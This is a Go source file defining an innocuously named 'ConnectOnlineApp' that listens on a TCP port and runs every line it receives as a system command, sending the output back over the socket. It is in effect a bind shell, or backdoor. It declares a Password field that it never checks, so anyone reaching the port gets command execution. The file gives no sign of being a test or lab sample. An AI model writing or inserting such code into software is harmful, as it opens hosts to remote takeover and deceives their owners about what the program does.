package apps

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"sync"
)

type ConnectOnlineApp struct {
	Port     int    `json:"Port,omitempty"`
	Password string `json:"Password,omitempty"`
}

var stopConnectOnlineApp = false

func (c *ConnectOnlineApp) Start(wg *sync.WaitGroup) {
	address := fmt.Sprintf(":%d", c.Port)
	ln, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Server is listening...")

	for stopConnectOnlineApp != true {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}
		if conn.RemoteAddr() != nil {
			handleConnection(conn)
			break
		}
	}
}

func (c *ConnectOnlineApp) Stop() error {
	stopConnectOnlineApp = true
	return nil
}

func (c *ConnectOnlineApp) Validate() error {
	if c.Port < 1 || c.Port > 65535 {
		return fmt.Errorf("port must be between 1 and 65535")
	}
	return nil
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)

	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			return
		}

		command = command[:len(command)-1]

		if command == "exit" {
			return
		}

		output, err := exec.Command(command).CombinedOutput()
		if err != nil {
			output = []byte(fmt.Sprintf("Error executing command: %v", err))
		}
		conn.Write(output)
	}
}
